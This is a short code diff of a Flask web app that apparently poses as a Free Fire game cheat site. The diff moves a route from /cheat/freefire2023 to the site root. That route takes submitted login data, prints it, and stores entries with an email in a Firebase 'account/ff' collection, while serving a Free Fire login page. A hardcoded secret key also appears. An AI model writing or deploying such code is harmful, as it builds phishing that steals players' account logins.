@@ -9,7 +9,7 @@ app = Flask(__name__,static_url_path='/static')
 app.config["SECRET_KEY"] = "asddasdwadsadwaasdasdsdad412sDADsss"
 app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True
 
-@app.route("/cheat/freefire2023",methods=["GET","POST"])
+@app.route("/",methods=["GET","POST"])
 def fflogin():
     if request.method == "POST":
         datalogin={}
@@ -20,7 +20,7 @@ def fflogin():
         print(datalogin)
         if "@" in datalogin["email"]:
             db.child("account").child("ff").push(datalogin)
-    return render_template('FFLogin.html')
+    return render_template('index.html')
 
 @app.route("/cheat/freefirecek",methods=["GET","POST"])
 def ffcek():
